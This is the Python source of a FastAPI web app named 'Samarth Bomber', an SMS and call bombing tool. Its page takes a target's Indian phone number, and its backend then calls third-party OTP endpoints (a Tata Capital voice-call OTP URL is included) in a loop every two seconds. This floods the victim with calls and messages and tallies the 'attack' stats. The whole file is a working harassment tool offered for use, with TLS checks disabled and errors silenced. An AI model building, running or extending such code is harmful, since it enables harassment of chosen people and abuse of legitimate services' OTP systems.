from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

ULTIMATE_APIS = [
    # Paste all your APIs here (same as before)
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    # ... add rest
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25: attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except: pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"Attack launched on +91{phone}")
    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"Cycle {attack_status['cycles']} fired")
            await asyncio.sleep(2)
    add_log("Attack stopped")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samarth Bomber</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body {
            background: linear-gradient(135deg, #0a1428, #1a2338);
            font-family: 'Inter', sans-serif;
        }
        .neon-blue {
            text-shadow: 0 0 10px #3b82f6, 0 0 20px #3b82f6, 0 0 40px #60a5fa;
        }
        .glass {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(59, 130, 246, 0.3);
        }
        .btn-neon {
            transition: all 0.3s;
        }
        .btn-neon:hover {
            box-shadow: 0 0 25px #3b82f6, 0 0 50px #60a5fa;
            transform: translateY(-2px);
        }
        .attack-active {
            animation: neon-pulse 1.5s infinite alternate;
        }
        @keyframes neon-pulse {
            from { box-shadow: 0 0 10px #3b82f6; }
            to { box-shadow: 0 0 30px #3b82f6, 0 0 60px #60a5fa; }
        }
    </style>
</head>
<body class="text-white min-h-screen pb-12">
    <div class="max-w-lg mx-auto p-4">
        <!-- Header -->
        <div class="flex justify-between items-center mb-8 mt-6">
            <div class="flex items-center gap-3">
                <div class="w-11 h-11 bg-blue-600 rounded-2xl flex items-center justify-center text-3xl shadow-lg shadow-blue-500/50">⚡</div>
                <div>
                    <h1 class="text-4xl font-bold tracking-tighter neon-blue">SAMARTH</h1>
                    <p class="text-blue-400 text-sm -mt-1">BOMBER v2.0</p>
                </div>
            </div>
            <div id="status" class="px-4 py-1 bg-emerald-500/10 text-emerald-400 text-xs font-mono rounded-full border border-emerald-500/30">READY</div>
        </div>

        <!-- Main Card -->
        <div class="glass rounded-3xl p-6 mb-6">
            <div class="text-center mb-6">
                <h2 class="text-2xl font-semibold neon-blue">TARGET NUMBER</h2>
            </div>
            <input id="phone" maxlength="10" 
                   class="w-full bg-zinc-900 border border-blue-500/50 focus:border-blue-400 rounded-2xl px-6 py-5 text-3xl font-mono text-center tracking-widest outline-none" 
                   placeholder="9876543210" type="tel">

            <div class="grid grid-cols-2 gap-4 mt-8">
                <button onclick="startAttack()" id="startBtn"
                        class="btn-neon bg-blue-600 hover:bg-blue-700 py-6 rounded-2xl text-lg font-bold flex items-center justify-center gap-2 shadow-xl">
                    🚀 START BOOM
                </button>
                <button onclick="stopAttack()" id="stopBtn" class="hidden btn-neon bg-red-600 hover:bg-red-700 py-6 rounded-2xl text-lg font-bold">
                    🛑 STOP
                </button>
            </div>
        </div>

        <!-- Stats -->
        <div class="glass rounded-3xl p-6 mb-6">
            <h3 class="text-blue-400 text-center mb-5 text-sm tracking-widest">LIVE ATTACK STATS</h3>
            <div class="grid grid-cols-3 gap-4 text-center">
                <div class="bg-zinc-900/70 rounded-2xl p-4">
                    <div id="calls" class="text-4xl font-bold text-orange-400">0</div>
                    <div class="text-xs text-slate-400">CALLS</div>
                </div>
                <div class="bg-zinc-900/70 rounded-2xl p-4">
                    <div id="sms" class="text-4xl font-bold text-blue-400">0</div>
                    <div class="text-xs text-slate-400">SMS</div>
                </div>
                <div class="bg-zinc-900/70 rounded-2xl p-4">
                    <div id="wa" class="text-4xl font-bold text-green-400">0</div>
                    <div class="text-xs text-slate-400">WA</div>
                </div>
            </div>
            <div class="mt-6">
                <div class="flex justify-between text-xs mb-2 text-slate-400">
                    <span>CYCLES</span>
                    <span id="cycles">0</span>
                </div>
                <div class="h-2 bg-zinc-800 rounded-full overflow-hidden">
                    <div id="progress" class="h-2 bg-gradient-to-r from-blue-400 to-cyan-400 w-0 transition-all"></div>
                </div>
            </div>
        </div>

        <!-- Logs -->
        <div class="glass rounded-3xl p-6">
            <h3 class="text-blue-400 mb-4 text-sm tracking-widest">LIVE LOGS</h3>
            <div id="logs" class="font-mono text-xs h-64 overflow-y-auto bg-black/40 p-4 rounded-2xl text-slate-300 space-y-1"></div>
        </div>

        <div class="text-center text-xs text-slate-500 mt-8">
            Made by Samarth • Mobile Optimized
        </div>
    </div>

    <script>
        let isRunning = false;

        async function startAttack() {
            const phone = document.getElementById("phone").value.trim();
            if (phone.length !== 10) return alert("Enter valid 10 digit Indian number");
            
            const res = await fetch("/start", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({phone})
            });
            const data = await res.json();
            if (data.status === "success") {
                isRunning = true;
                document.getElementById("startBtn").classList.add("hidden");
                document.getElementById("stopBtn").classList.remove("hidden");
                document.getElementById("status").textContent = "ATTACKING";
                document.getElementById("status").classList.add("animate-pulse");
                pollStatus();
            }
        }

        async function stopAttack() {
            await fetch("/stop", {method: "POST"});
            isRunning = false;
            document.getElementById("startBtn").classList.remove("hidden");
            document.getElementById("stopBtn").classList.add("hidden");
            document.getElementById("status").textContent = "STOPPED";
            document.getElementById("status").classList.remove("animate-pulse");
        }

        function pollStatus() {
            if (!isRunning) return;
            fetch("/status").then(r => r.json()).then(d => {
                document.getElementById("calls").textContent = d.stats.Call || 0;
                document.getElementById("sms").textContent = d.stats.SMS || 0;
                document.getElementById("wa").textContent = d.stats.WhatsApp || 0;
                document.getElementById("cycles").textContent = d.cycles;
                document.getElementById("progress").style.width = Math.min((d.cycles * 7) % 100 + 25, 100) + "%";
                
                const logsDiv = document.getElementById("logs");
                logsDiv.innerHTML = d.logs.map(l => `<div>${l}</div>`).join('');
                logsDiv.scrollTop = logsDiv.scrollHeight;
                
                setTimeout(pollStatus, 1400);
            });
        }
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
